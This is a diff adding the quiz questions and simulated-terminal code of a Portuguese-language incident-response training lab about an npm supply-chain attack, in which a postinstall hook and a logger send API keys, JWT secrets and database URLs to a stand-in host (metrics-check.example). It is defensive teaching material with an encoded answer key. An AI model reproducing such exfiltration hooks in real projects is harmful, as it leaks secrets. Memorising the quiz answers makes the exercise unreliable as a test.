+                "text": "git diff HEAD~1, porque mostra a diferença do último commit em relação ao estado anterior."
+            },
+            {
+                "id": "zhpcf07u",
+                "text": "git log --oneline, porque lista os commits e ajuda a selecionar candidatos para inspeção."
+            },
+            {
+                "id": "qnupqzit",
+                "text": "git grep metrics, porque busca termos suspeitos em todos os arquivos do estado atual."
+            }
+        ],
+        "feedbackKey": 8
+    },
+    {
+        "phase": 3,
+        "text": "Por que postinstall é mais crítico que um script npm comum neste cenário?",
+        "options": [
+            {
+                "id": "3uea3ge8",
+                "text": "Porque roda no npm install/ci sem chamada manual do usuário."
+            },
+            {
+                "id": "n6qiwepx",
+                "text": "Porque costuma receber privilégios administrativos no runner."
+            },
+            {
+                "id": "sk28t7a9",
+                "text": "Porque raramente aparece em revisão de código superficial."
+            },
+            {
+                "id": "tgiqhg9j",
+                "text": "Porque só dispara quando a aplicação entra em produção."
+            }
+        ],
+        "feedbackKey": 9
+    },
+    {
+        "phase": 3,
+        "text": "Qual combinação de permissões no workflow cria o risco MAIS abrangente?",
+        "options": [
+            {
+                "id": "rsnvnq65",
+                "text": "contents: write + id-token: write + secrets: inherit."
+            },
+            {
+                "id": "qdf1rcav",
+                "text": "contents: read + packages: write + checks: read."
+            },
+            {
+                "id": "iqk2919a",
+                "text": "pull-requests: write + issues: write + actions: read."
+            },
+            {
+                "id": "hej8cx9j",
+                "text": "statuses: write + deployments: read + metadata: read."
+            }
+        ],
+        "feedbackKey": 10
+    },
+    {
+        "phase": 3,
+        "text": "Qual classificação técnica descreve MELHOR o incidente?",
+        "options": [
+            {
+                "id": "1ictxcwn",
+                "text": "Comprometimento de supply chain com execução via lifecycle hook e abuso de CI/CD para exposição de secrets."
+            },
+            {
+                "id": "pgw90jpk",
+                "text": "Vulnerabilidade de aplicação web do tipo XSS armazenado acionado por telemetria de frontend."
+            },
+            {
+                "id": "l0blv0pr",
+                "text": "Ataque de rede do tipo man-in-the-middle explorando ausência de validação TLS no client HTTP."
+            },
+            {
+                "id": "kgyc4om3",
+                "text": "Falha de hardening local causada por permissão excessiva de arquivos no diretório scripts."
+            }
+        ],
+        "feedbackKey": 11
+    },
+    {
+        "phase": 4,
+        "text": "Qual impacto deve ser assumido primeiro pela equipe de resposta a incidentes?",
+        "options": [
+            {
+                "id": "wtoobmzv",
+                "text": "Comprometimento dos secrets coletados, com risco de acesso a APIs, banco de dados e validação/assinatura JWT."
+            },
+            {
+                "id": "rerw6z8v",
+                "text": "Exposição apenas de hostname e NODE_ENV, sem impacto material até confirmação do domínio externo."
+            },
+            {
+                "id": "bhqlqcg1",
+                "text": "Quebra limitada de observabilidade, pois o código malicioso está nomeado como telemetria."
+            },
+            {
+                "id": "wu16hymq",
+                "text": "Comprometimento apenas do ambiente local do desenvolvedor que executou npm install."
+            }
+        ],
+        "feedbackKey": 12
+    },
+    {
+        "phase": 4,
+        "text": "Por que secrets: inherit muda a severidade do incidente?",
+        "options": [
+            {
+                "id": "c1a78mx1",
+                "text": "Porque pode herdar secrets do repo base em fluxo acionado por pull_request_target."
+            },
+            {
+                "id": "evuht6t0",
+                "text": "Porque pode enfraquecer a revisão quando combinado com branch protection permissivo."
+            },
+            {
+                "id": "uzs9im0y",
+                "text": "Porque pode mascarar variáveis sensíveis nos logs sem impedir uso indevido."
+            },
+            {
+                "id": "ltz9atsn",
+                "text": "Porque pode ampliar o impacto se o runner executar código não confiável."
+            }
+        ],
+        "feedbackKey": 13
+    },
+    {
+        "phase": 4,
+        "text": "A data 2024-12-01 ajuda a investigação por qual razão MAIS correta?",
+        "options": [
+            {
+                "id": "1u322n64",
+                "text": "Ajuda a delimitar janela de comprometimento e priorizar pipelines, installs e deploys após o commit."
+            },
+            {
+                "id": "kfs6vfpt",
+                "text": "Sugere menor vigilância operacional, mas não prova intenção do autor do commit."
+            },
+            {
+                "id": "omjbcp4e",
+                "text": "Indica ponto de partida para comparar eventos anteriores e posteriores no SIEM."
+            },
+            {
+                "id": "30my5zpj",
+                "text": "Ajuda a correlacionar mudanças de código com tráfego externo suspeito."
+            }
+        ],
+        "feedbackKey": 14
+    },
+    {
+        "phase": 4,
+        "text": "Qual interpretação é MAIS adequada sobre a presença de exfiltração em telemetry.js e logger.ts?",
+        "options": [
+            {
+                "id": "ag1ol73d",
+                "text": "Cria redundância: um canal roda na instalação e outro durante erros da aplicação."
+            },
+            {
+                "id": "9ph3i379",
+                "text": "Pode parecer duplicidade de observabilidade, por isso exige correlação com os endpoints."
+            },
+            {
+                "id": "u26192k4",
+                "text": "Mantém um segundo ponto suspeito caso o script de instalação seja removido."
+            },
+            {
+                "id": "2qpr75pr",
+                "text": "Aumenta a chance de captura de secrets em momentos diferentes do ciclo da aplicação."
+            }
+        ],
+        "feedbackKey": 15
+    },
+    {
+        "phase": 5,
+        "text": "Qual remediação é MAIS urgente antes mesmo de discutir refatoração do código?",
+        "options": [
+            {
+                "id": "2esprvu8",
+                "text": "Revogar e rotacionar API_KEY, JWT_SECRET, DATABASE_URL e quaisquer secrets acessíveis ao workflow comprometido."
+            },
+            {
+                "id": "fijoyjne",
+                "text": "Remover apenas scripts/telemetry.js e abrir uma PR limpa com descrição detalhada."
+            },
+            {
+                "id": "00v830dn",
+                "text": "Renomear a branch main e bloquear temporariamente novos merges até concluir post-mortem."
+            },
+            {
+                "id": "0yby4awt",
+                "text": "Trocar axios por fetch nativo para reduzir dependência externa de comunicação HTTP."
+            }
+        ],
+        "feedbackKey": 16
+    },
+    {
+        "phase": 5,
+        "text": "Qual conjunto de correções fecha MELHOR a cadeia de ataque identificada?",
+        "options": [
+            {
+                "id": "y088o5or",
+                "text": "Remover payload e pacote, rotacionar secrets, restringir workflow e auditar execuções."
+            },
+            {
+                "id": "15byvzk3",
+                "text": "Apagar o commit, reinstalar dependências e rodar npm audit até zerar críticos."
+            },
+            {
+                "id": "i8bzbf1i",
+                "text": "Manter o pacote, remover o endpoint externo e monitorar novas execuções."
+            },
+            {
+                "id": "3ldqyun3",
+                "text": "Desabilitar CI temporariamente e exigir aprovação manual em todo pull request."
+            }
+        ],
+        "feedbackKey": 17
+    },
+    {
+        "phase": 5,
+        "text": "Qual comando do lab valida MELHOR se o postinstall ainda está presente no estado atual do repositório?",
+        "options": [
+            {
+                "id": "uvyr0qf4",
+                "text": "cat package.json, porque mostra diretamente a seção scripts e a dependência adicionada."
+            },
+            {
+                "id": "b8dwoecb",
+                "text": "git log --oneline, porque lista a sequência histórica de commits recentes."
+            },
+            {
+                "id": "pmbjpi4h",
+                "text": "git blame .github/workflows/ci.yml, porque mostra autoria das linhas do pipeline."
+            },
+            {
+                "id": "n3qxkhkt",
+                "text": "git diff a3f9d2e b7c3a1f, porque compara commits anteriores ao incidente."
+            }
+        ],
+        "feedbackKey": 18
+    },
+    {
+        "phase": 5,
+        "text": "Qual relatório final seria tecnicamente MAIS defensável para a banca?",
+        "options": [
+            {
+                "id": "431rupfr",
+                "text": "d2f8a9c conectou postinstall, telemetria, exfiltração e workflow permissivo; trate secrets como comprometidos."
+            },
+            {
+                "id": "2p3yvb5u",
+                "text": "m.oliveira deve ser responsabilizado, pois o git blame aponta seu usuário nas linhas alteradas."
+            },
+            {
+                "id": "l5nwqvrr",
+                "text": "axios foi a causa principal, já que permitiu POST para domínio externo no logger.ts."
+            },
+            {
+                "id": "9a7mfp05",
+                "text": "rate limiting era o problema central, pois só entrou depois do commit malicioso."
+            }
+        ],
+        "feedbackKey": 19
+    }
+];
+}
+
+function getCorrectId(qi) {
+  return decode(ENCODED_ANSWERS[qi]);
+}
+// ============================================================
+// STATE
+// ============================================================
+let state = {
+  phase: 1,
+  answers: {}, // questionIndex -> { answered: bool, correct: bool }
+  lastWrong: {}, // questionIndex -> last wrong attempt, allows retry
+  wrongAttempts: 0,
+  totalCorrect: 0,
+  totalAnswered: 0,
+  history: [],
+  historyPos: -1,
+  muted: false,
+  finished: false
+};
+
+function saveState() {
+  localStorage.setItem('gflab_state', JSON.stringify(state));
+}
+
+function loadState() {
+  try {
+    const saved = localStorage.getItem('gflab_state');
+    if (saved) {
+      const s = JSON.parse(saved);
+      Object.assign(state, s);
+    }
+  } catch(e) {}
+}
+
+// ============================================================
+// AUDIO
+// ============================================================
+const AudioCtx = window.AudioContext || window.webkitAudioContext;
+let audioCtx;
+
+function getAudio() {
+  if (!audioCtx) audioCtx = new AudioCtx();
+  return audioCtx;
+}
+
+function playTone(freq, type, duration, vol=0.1) {
+  if (state.muted) return;
+  try {
+    const ctx = getAudio();
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.connect(g); g.connect(ctx.destination);
+    o.frequency.value = freq;
+    o.type = type;
+    g.gain.setValueAtTime(vol, ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+    o.start(); o.stop(ctx.currentTime + duration);
+  } catch(e) {}
+}
+
+function playCorrect() { playTone(880, 'sine', 0.15); setTimeout(() => playTone(1100, 'sine', 0.2), 80); }
+function playWrong() { playTone(220, 'sawtooth', 0.3, 0.08); }
+function playType() { playTone(600 + Math.random()*200, 'square', 0.04, 0.02); }
+function playCmd() { playTone(440, 'sine', 0.1, 0.05); }
+
+function toggleMute() {
+  state.muted = !state.muted;
+  document.getElementById('mute-btn').textContent = state.muted ? '🔇' : '🔊';
+  saveState();
+}
+
+// ============================================================
+// TERMINAL ENGINE
+// ============================================================
+function termOutput(text, cls='') {
+  const body = document.getElementById('terminal-body');
+  const div = document.createElement('div');
+  div.className = 'terminal-output' + (cls ? ' ' + cls : '');
+  div.textContent = text;
+  body.appendChild(div);
+  body.scrollTop = body.scrollHeight;
+}
+
+function termLine(prompt, cmd) {
+  const body = document.getElementById('terminal-body');
+  const line = document.createElement('div');
+  line.className = 'terminal-line';
+  line.innerHTML = `<span class="prompt"><span class="prompt-path">~/compromised-repo</span> $</span><span style="color:var(--text)">${escapeHtml(cmd)}</span>`;
+  body.appendChild(line);
+  body.scrollTop = body.scrollHeight;
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function focusInput() {
+  document.getElementById('terminal-input').focus();
+}
+
+function execCommand(cmd) {
+  const trimmed = cmd.trim();
+  if (!trimmed) return;
+
+  termLine('', trimmed);
+  playCmd();
+
+  // history
+  if (state.history[state.history.length-1] !== trimmed) {
+    state.history.push(trimmed);
+    if (state.history.length > 50) state.history.shift();
+  }
+  state.historyPos = -1;
+
+  // Parse
+  const parts = trimmed.split(/\s+/);
+  const base = parts[0];
+  const args = parts.slice(1);
+
+  // Commands
+  if (base === 'clear') {
+    document.getElementById('terminal-body').innerHTML = '';
+    return;
+  }
+  if (base === 'help') { showHelp(); return; }
+  if (base === 'ls') { doLs(args); return; }
+  if (base === 'cat') { doCat(args); return; }
+  if (base === 'git') { doGit(args); return; }
+  if (base === 'npm') { doNpm(args); return; }
+  if (base === 'grep' || (base === 'git' && args[0] === 'grep')) { doGrep(args); return; }
+
+  termOutput(`bash: ${base}: command not found. Digite 'help' para ver os comandos.`, 'error');
+}
+
+function showHelp() {
+  termOutput('');
+  termOutput('Comandos disponíveis:', 'info');
+  termOutput('  ls                         Lista arquivos do repositório');
+  termOutput('  cat <arquivo>              Mostra conteúdo de um arquivo');
+  termOutput('  git log                    Histórico de commits');
+  termOutput('  git log --oneline          Histórico resumido');
+  termOutput('  git show <hash>            Mostra detalhes de um commit');
+  termOutput('  git diff <hash1> <hash2>   Diferença entre commits');
+  termOutput('  git blame <arquivo>        Autoria linha a linha');
+  termOutput('  git grep <termo>           Busca em todos os arquivos');
+  termOutput('  grep <termo> <arquivo>     Busca em arquivo específico');
+  termOutput('  npm ci --dry-run           Simula instalação e lifecycle hooks');
+  termOutput('  npm audit                  Mostra achados de dependências do cenário');
+  termOutput('  clear                      Limpa o terminal');
+  termOutput('');
+}
+
+function doLs(args) {
+  const files = Object.keys(REPO.files);
+  // Group by dir
+  const dirs = {};
+  files.forEach(f => {
+    const parts2 = f.split('/');
+    if (parts2.length === 1) {
+      dirs[''] = dirs[''] || [];
+      dirs[''].push(f);
+    } else {
+      const dir = parts2.slice(0,-1).join('/');
+      dirs[dir] = dirs[dir] || [];
+      dirs[dir].push(f);
+    }
+  });
+  termOutput('');
+  termOutput('Arquivos no repositório:', 'dim');
+  files.forEach(f => {
+    const isMalicious = ['scripts/telemetry.js','src/utils/logger.ts','.github/workflows/ci.yml','package.json'].includes(f);
+    termOutput('  ' + f, isMalicious ? 'highlight' : '');
+  });
+  termOutput('');
+}
+
+function doCat(args) {
+  if (!args.length) { termOutput('Usage: cat <arquivo>', 'error'); return; }
+  const fname = args[0];
+  const content = REPO.files[fname];
+  if (!content) {
+    termOutput(`cat: ${fname}: No such file or directory`, 'error');
+    return;
+  }
+  termOutput('');
+  content.split('\n').forEach(line => {
+    const suspicious = line.includes('metrics-check') || line.includes('process.env.API_KEY') ||
+      line.includes('process.env.JWT_SECRET') || line.includes('process.env.DATABASE_URL') ||
+      line.includes('postinstall') || line.includes('pull_request_target') || line.includes('secrets: inherit');
+    termOutput(line, suspicious ? 'warning' : '');
+  });
+  termOutput('');
+}
+
+function doGit(args) {
+  if (!args.length) { termOutput('usage: git <command> [args]', 'error'); return; }
+
+  const sub = args[0];
+
+  if (sub === 'log') { doGitLog(args.slice(1)); return; }
+  if (sub === 'show') { doGitShow(args.slice(1)); return; }
+  if (sub === 'diff') { doGitDiff(args.slice(1)); return; }
+  if (sub === 'blame') { doGitBlame(args.slice(1)); return; }
+  if (sub === 'grep') { doGitGrep(args.slice(1)); return; }
+  if (sub === 'status') { termOutput('On branch main\nnothing to commit, working tree clean', 'dim'); return; }
+
+  termOutput(`git: '${sub}' is not a git command. See 'help'`, 'error');
+}
+
+function doGitLog(args) {
+  const oneline = args.includes('--oneline');
+  const isPatch = args.includes('--patch') || args.includes('-p');
+  const fileArg = args.find(a => !a.startsWith('-') && REPO.files[a]);
+
+  termOutput('');
+  const commits = fileArg
+    ? REPO.commits.filter(c => c.files.includes(fileArg))
+    : [...REPO.commits].reverse();
+
+  commits.forEach(c => {
+    if (oneline) {
+      termOutput(`${c.hash}  ${c.msg}`, c.malicious ? 'warning' : '');
+    } else {
+      termOutput(`commit ${c.fullHash}`, c.malicious ? 'warning' : 'info');
+      termOutput(`Author: ${c.author} <${c.email}>`, 'dim');
+      termOutput(`Date:   ${c.date}`, 'dim');
+      termOutput('');
+      termOutput(`    ${c.msg}`);
+      if (c.files.length) {
+        termOutput('');
+        termOutput(`    Files: ${c.files.join(', ')}`, 'dim');
+      }
+      termOutput('');
+      if (isPatch) {
+        c.diff.split('\n').forEach(l => {
+          if (l.startsWith('+') && !l.startsWith('+++')) termOutput(l, 'success');
+          else if (l.startsWith('-') && !l.startsWith('---')) termOutput(l, 'error');
+          else if (l.startsWith('@@')) termOutput(l, 'info');
+          else termOutput(l, 'dim');
+        });
+        termOutput('');
+      }
+    }
+  });
+}
+
+function doGitShow(args) {
+  if (!args.length) {
+    // show latest
+    const c = REPO.commits.find(x => x.hash === 'd2f8a9c') || REPO.commits[REPO.commits.length-1];
+    showCommit(c);
+    return;
+  }
+  const hash = args[0];
+  const c = REPO.commits.find(x => x.hash === hash || x.fullHash === hash || x.fullHash.startsWith(hash));
+  if (!c) { termOutput(`fatal: ambiguous argument '${hash}': unknown revision`, 'error'); return; }
+  showCommit(c);
+}
+
+function showCommit(c) {
+  termOutput('');
+  termOutput(`commit ${c.fullHash}`, c.malicious ? 'warning' : 'info');
+  termOutput(`Author: ${c.author} <${c.email}>`, 'dim');
+  termOutput(`Date:   ${c.date}`, 'dim');
+  termOutput('');
+  termOutput(`    ${c.msg}`);
+  termOutput('');
+  c.diff.split('\n').forEach(l => {
+    if (l.startsWith('diff --git')) termOutput(l, 'info');
+    else if (l.startsWith('+++') || l.startsWith('---')) termOutput(l, 'dim');
+    else if (l.startsWith('+')) termOutput(l, 'success');
+    else if (l.startsWith('-')) termOutput(l, 'error');
+    else if (l.startsWith('@@')) termOutput(l, 'info');
+    else termOutput(l, 'dim');
+  });
+  termOutput('');
+  if (c.malicious) {
+    termOutput('⚠  ATENÇÃO: Este commit contém modificações suspeitas!', 'warning');
+    termOutput('');
+  }
+}
+
+function doGitDiff(args) {
+  if (args.length < 2) {
+    termOutput('Mostrando diff do HEAD~1:', 'dim');
+    termOutput('');
+    const c = REPO.commits[REPO.commits.length-1];
+    showCommit(c);
+    return;
+  }
+  const h1 = args[0], h2 = args[1];
+  const c1 = REPO.commits.find(x => x.hash === h1 || x.fullHash.startsWith(h1));
+  const c2 = REPO.commits.find(x => x.hash === h2 || x.fullHash.startsWith(h2));
+  if (!c1 || !c2) { termOutput('fatal: invalid object name', 'error'); return; }
+  termOutput(`diff ${c1.hash}..${c2.hash}`, 'info');
+  c2.diff.split('\n').forEach(l => {
+    if (l.startsWith('+') && !l.startsWith('+++')) termOutput(l, 'success');
+    else if (l.startsWith('-') && !l.startsWith('---')) termOutput(l, 'error');
+    else if (l.startsWith('@@')) termOutput(l, 'info');
+    else termOutput(l, 'dim');
+  });
+}
+
+function doGitBlame(args) {
+  if (!args.length) { termOutput('Usage: git blame <file>', 'error'); return; }
+  const fname = args[0];
+  const content = REPO.files[fname];
+  if (!content) { termOutput(`fatal: no such path '${fname}'`, 'error'); return; }
+
+  // Find commits touching this file
+  const fileCommits = REPO.commits.filter(c => c.files.includes(fname));
+  const lastCommit = fileCommits[fileCommits.length-1];
+
+  termOutput('');
+  content.split('\n').forEach((line, i) => {
+    const lineNum = String(i+1).padStart(3);
+    const isSuspicious = line.includes('metrics-check') || line.includes('API_KEY') ||
+      line.includes('JWT_SECRET') || line.includes('DATABASE_URL') || line.includes('postinstall') ||
+      line.includes('pull_request_target') || line.includes('secrets: inherit') ||
+      line.includes('analytics-node-pkg');
+    const hash = isSuspicious ? 'd2f8a9c' : (fileCommits[0] || lastCommit).hash;
+    const author = isSuspicious ? 'm.oliveira' : (fileCommits[0] || lastCommit).author;
+    const date2 = isSuspicious ? '2024-12-01' : (fileCommits[0] || lastCommit).date.split(' ')[0];
+    const display = `${hash} (${author.padEnd(12)} ${date2} ${lineNum}) ${line}`;
+    termOutput(display, isSuspicious ? 'warning' : 'dim');
+  });
+  termOutput('');
+}
+
+function doGitGrep(args) {
+  if (!args.length) { termOutput('Usage: git grep <pattern>', 'error'); return; }
+  const pattern = args.join(' ').replace(/^["']|["']$/g, '');
+  const re = new RegExp(pattern, 'i');
+  termOutput('');
+  let found = false;
+  Object.entries(REPO.files).forEach(([fname, content]) => {
+    content.split('\n').forEach((line, i) => {
+      if (re.test(line)) {
+        const highlighted = line.replace(re, m => `[${m}]`);
+        termOutput(`${fname}:${i+1}:${highlighted}`, 'warning');
+        found = true;
+      }
+    });
+  });
+  if (!found) termOutput(`(nenhum resultado para '${pattern}')`, 'dim');
+  termOutput('');
+}
+
+function doGrep(args) {
+  if (args.length < 2) { doGitGrep(args); return; }
+  const pattern = args[0];
+  const fname = args[args.length-1];
+  const content = REPO.files[fname];
+  if (!content) { termOutput(`grep: ${fname}: No such file`, 'error'); return; }
+  const re = new RegExp(pattern, 'i');
+  termOutput('');
+  let found = false;
+  content.split('\n').forEach((line, i) => {
+    if (re.test(line)) {
+      termOutput(`${i+1}:${line}`, 'warning');
+      found = true;
+    }
+  });
+  if (!found) termOutput('(nenhum resultado)', 'dim');
+  termOutput('');
+}
+
+function doNpm(args) {
+  const sub = args[0];
+  termOutput('');
+  if (sub === 'ci') {
+    termOutput('npm ci --dry-run', 'info');
+    termOutput('> installing dependencies from package-lock.json', 'dim');
+    termOutput('> lifecycle: postinstall -> node scripts/telemetry.js', 'warning');
+    termOutput('> simulated egress: POST https://metrics-check.example/collect', 'warning');
+    termOutput('dry-run: nenhum pacote foi instalado. Evidência: postinstall seria executado.', 'dim');
+    termOutput('');
+    return;
+  }
+  if (sub === 'audit') {
+    termOutput('npm audit report', 'info');
+    termOutput('analytics-node-pkg  0.0.3', 'warning');
+    termOutput('Severity: high · pacote recém-adicionado sem reputação no cenário do lab', 'warning');
+    termOutput('Observação: audit isolado não prova exfiltração; correlacione com git show, package.json e telemetry.js.', 'dim');
+    termOutput('');
+    return;
+  }
+  termOutput('Usage: npm ci --dry-run | npm audit', 'error');
+  termOutput('');
+}
+
+// ============================================================
+// PHASE CONFIG
+// ============================================================
+const PHASES = [
+  {
+    num: 1, title: "Localizar o Commit Suspeito",
+    desc: "Analise o histórico de commits e identifique onde o código malicioso foi introduzido. Um commit 'inocente demais' pode ser a maior ameaça.",
+    hints: ["git log", "git log --oneline", "git show <hash>"]
+  },
+  {
+    num: 2, title: "Identificar o Vetor de Entrada",
+    desc: "O ataque não chegou sozinho. Descubra como o código malicioso entrou: dependências, scripts, hooks. Siga o rastro.",
+    hints: ["cat package.json", "git show d2f8a9c", "git grep postinstall", "npm ci --dry-run"]
+  },
+  {
+    num: 3, title: "Mapear o Mecanismo de Execução",
+    desc: "Como o código malicioso é executado? CI/CD, lifecycle hooks, eventos GitHub. O diabo está nos detalhes do pipeline.",
+    hints: ["cat .github/workflows/ci.yml", "git blame src/utils/logger.ts", "git grep pull_request_target"]
+  },
+  {
+    num: 4, title: "Avaliar o Impacto",
+    desc: "Quantos dados vazaram? Quais secrets foram expostos? Qual o raio de destruição? Hora de contar os danos.",
+    hints: ["cat scripts/telemetry.js", "cat src/utils/logger.ts", "grep API_KEY scripts/telemetry.js"]
+  },
+  {
+    num: 5, title: "Definir a Remediação",
+    desc: "Identificar o ataque foi fácil. Consertar sem deixar brechas é outra história. Qual a sequência correta de ações?",
+    hints: ["cat package.json", "npm audit", "git show d2f8a9c"]
+  }
+];
+
+// ============================================================
+// QUESTIONS BUILD + RENDER
+// ============================================================
+let QUESTIONS = [];
+let questionPhaseMap = {}; // phase -> [qi]
+
+function initQuestions() {
+  const raw = buildQuestions();
+  // Shuffle option order per question. Correct answer is validated by obfuscated option id.
+  QUESTIONS = raw.map((q, qi) => {
+    const opts = q.options.map(opt => ({ id: opt.id, text: opt.text }));
+    for (let i = opts.length-1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i+1));
+      [opts[i], opts[j]] = [opts[j], opts[i]];
+    }
+    return { ...q, shuffledOpts: opts, qi };
+  });
+
+  // Build phase map
+  PHASES.forEach((_, pi) => {
+    questionPhaseMap[pi+1] = QUESTIONS
+      .map((q, i) => ({ q, i }))
+      .filter(({ q }) => q.phase === pi+1)
+      .map(({ i }) => i);
+  });
+}
+
+function renderPhase() {
+  const phase = PHASES[state.phase - 1];
+  document.getElementById('phase-badge').textContent = `📍 Fase ${state.phase} de 5`;
+  document.getElementById('phase-title').textContent = phase.title;
+  document.getElementById('phase-desc').textContent = phase.desc;
+
+  // Hints
+  const hintContainer = document.getElementById('hint-chips');
+  hintContainer.innerHTML = '';
+  phase.hints.forEach(h => {
+    const chip = document.createElement('span');
+    chip.className = 'hint-chip';
+    chip.textContent = h;
+    chip.onclick = () => {
+      if (isMobile()) switchMobileTab('terminal');
+      const input = document.getElementById('terminal-input');
+      input.value = h;
+      input.focus();
+    };
+    hintContainer.appendChild(chip);
+  });
+
+  // Phase dots
+  const dots = document.querySelectorAll('.phase-dot');
+  dots.forEach((d, i) => {
+    d.classList.remove('done', 'active');
+    if (i < state.phase - 1) d.classList.add('done');
+    else if (i === state.phase - 1) d.classList.add('active');
+  });
+
+  renderQuestions();
+}
+
+function renderQuestions() {
+  const container = document.getElementById('questions-section');
+  container.innerHTML = '';
+
+  QUESTIONS.forEach((q, qi) => {
+    const isCurrentPhase = q.phase === state.phase;
+    const isEarlierPhase = q.phase < state.phase;
+    const isLaterPhase = q.phase > state.phase;
+    const answered = state.answers[qi];
+
+    const card = document.createElement('div');
+    card.className = 'question-card';
+    card.id = `q-card-${qi}`;
+
+    if (isLaterPhase) card.classList.add('locked');
+    else if (answered?.correct) card.classList.add('correct');
+    else if (!isCurrentPhase && isEarlierPhase && answered) {
+      // Previously answered
+    } else if (isCurrentPhase && !answered) card.classList.add('active');
+
+    const letters = ['A', 'B', 'C', 'D'];
+
+    card.innerHTML = `
+      <div class="q-number">Q${qi+1} · Fase ${q.phase}</div>
+      <div class="q-text">${q.text}</div>
+      <div class="q-options">
+        ${q.shuffledOpts.map((opt, oi) => `
+          <button class="q-option ${answered ? getOptClass(qi, oi) : ''}"
+                  onclick="answerQuestion(${qi}, ${oi})"
+                  ${answered?.correct ? 'disabled' : ''}>
+            <span class="opt-letter">${letters[oi]}</span>
+            <span>${escapeHtml(opt.text)}</span>
+          </button>
+        `).join('')}
+      </div>
+      <div class="q-feedback ${answered?.correct ? 'correct' : (state.lastWrong && state.lastWrong[qi] ? 'wrong' : '')}" id="q-fb-${qi}">
+        ${answered ? getFeedbackText(qi, true) : (state.lastWrong && state.lastWrong[qi] ? getFeedbackText(qi, false) : '')}
+      </div>
+    `;
+
+    container.appendChild(card);
+  });
+}
+
+function getOptClass(qi, oi) {
+  const q = QUESTIONS[qi];
+  const answered = state.answers[qi];
+  const lastWrong = state.lastWrong && state.lastWrong[qi];
+  const correctId = getCorrectId(qi);
+  const isCorrectOpt = q.shuffledOpts[oi].id === correctId;
+
+  if (answered?.correct) {
+    if (isCorrectOpt) return 'selected-correct';
+    return '';
+  }
+
+  if (lastWrong && oi === lastWrong.selectedOi) return 'selected-wrong';
+  return '';
+}
+
+function getFeedbackText(qi, correct) {
+  const fb = decode(ENCODED_FEEDBACKS[QUESTIONS[qi].feedbackKey]);
+  if (correct) return `✓ ${fb}`;
+  return `✗ Resposta incorreta. ${fb}`;
+}
+
+function answerQuestion(qi, selectedOi) {
+  if (state.answers[qi]?.correct) return;
+  const q = QUESTIONS[qi];
+  const selectedOpt = q.shuffledOpts[selectedOi];
+  const isCorrect = selectedOpt.id === getCorrectId(qi);
+
+  state.lastWrong = state.lastWrong || {};
+  state.wrongAttempts = state.wrongAttempts || 0;
+
+  if (isCorrect) {
+    state.answers[qi] = { answered: true, correct: true, selectedOi };
+    delete state.lastWrong[qi];
+    playCorrect();
+  } else {
+    state.lastWrong[qi] = { selectedOi, at: Date.now() };
+    state.wrongAttempts++;
+    playWrong();
+  }
+
+  updateScore();
+  renderQuestions();
+  checkPhaseProgress();
+  updateMobileTabBadge();
+  saveState();
+
+  setTimeout(() => {
+    const card = document.getElementById(`q-card-${qi}`);
+    if (card) card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }, 100);
+}
+
+function checkPhaseProgress() {
+  const phaseQs = questionPhaseMap[state.phase];
+  if (!phaseQs) return;
+  const allCorrect = phaseQs.every(qi => state.answers[qi]?.correct);
+
+  if (allCorrect) {
+    if (state.phase < 5) {
+      setTimeout(() => {
+        state.phase++;
+        saveState();
+        renderPhase();
+        showToast(`🎯 Fase ${state.phase} desbloqueada!`, 'success');
+        termOutput(`\n[SISTEMA] Fase ${state.phase}/5 desbloqueada. Continue a investigação.`, 'success');
+        termOutput('');
+      }, 800);
+    } else {
+      setTimeout(showResults, 1200);
+    }
+  }
+
+  const allQCorrect = QUESTIONS.every((q, qi) => state.answers[qi]?.correct);
+  if (allQCorrect) {
+    setTimeout(showResults, 1500);
+  }
+}
+
+function updateScore() {
+  const correctNow = Object.values(state.answers || {}).filter(a => a?.correct).length;
+  state.totalCorrect = correctNow;
+  state.totalAnswered = correctNow;
+  const pct = Math.round((correctNow / 20) * 100);
+  document.getElementById('score-pct').textContent = pct + '%';
+  document.getElementById('score-detail').textContent =
+    `${correctNow} corretas de 20 · ${state.wrongAttempts || 0} tentativas incorretas`;
+  document.getElementById('progress-text').textContent = `${correctNow}/20`;
+  document.getElementById('progress-fill').style.width = (correctNow / 20 * 100) + '%';
+  document.getElementById('score-pct').style.color =
+    pct >= 70 ? 'var(--green)' : pct >= 50 ? 'var(--yellow)' : 'var(--red)';
+}
+
+// ============================================================
+// RESULTS
+// ============================================================
+function showResults() {
+  const correctNow = Object.values(state.answers || {}).filter(a => a?.correct).length;
+  state.totalCorrect = correctNow;
+  const pct = Math.round((correctNow / 20) * 100);
+  const passed = pct >= 70;
+
+  document.getElementById('results-screen').classList.add('visible');
+
+  const icon = document.getElementById('results-icon');
+  const title = document.getElementById('results-title');
+  const sub = document.getElementById('results-subtitle');
+  const scoreBig = document.getElementById('results-score-big');
+
+  scoreBig.textContent = pct + '%';
+  scoreBig.style.color = passed ? 'var(--green)' : 'var(--red)';
+  scoreBig.style.textShadow = passed ? 'var(--glow)' : 'var(--glow-red)';
+
+  document.getElementById('stat-correct').textContent = state.totalCorrect;
+  document.getElementById('stat-wrong').textContent = state.wrongAttempts || 0;
+  document.getElementById('stat-pct').textContent = pct + '%';
+
+  if (passed) {
+    icon.textContent = '🏆';
+    title.textContent = 'Investigação Concluída';
+    title.style.color = 'var(--green)';
+    sub.textContent = 'Você identificou o ataque com sucesso. Seus secrets agradecem.';
+    document.getElementById('cert-form').style.display = 'block';
+  } else {
+    icon.textContent = '💀';
+    title.textContent = 'Você Foi Comprometido';
+    title.style.color = 'var(--red)';
+    sub.textContent = `${pct}% de acerto. O atacante agradece sua ineficiência. Mínimo: 70%.`;
+    document.getElementById('cert-form').style.display = 'none';
+  }
+
+  state.finished = true;
+  saveState();
+}
+
+// ============================================================
+// CERTIFICATE GENERATOR
+// ============================================================
+function generateCert() {
+  const name = document.getElementById('cert-name').value.trim();
+  if (!name) {
+    showToast('Digite seu nome para o certificado!', 'error');
+    return;
+  }
+
+  const canvas = document.getElementById('cert-canvas');
+  const W = 1100, H = 780;
+  canvas.width = W;
+  canvas.height = H;
+  const ctx = canvas.getContext('2d');
+
+  // Background gradient
+  const bgGrad = ctx.createLinearGradient(0, 0, W, H);
+  bgGrad.addColorStop(0, '#f8f9ff');
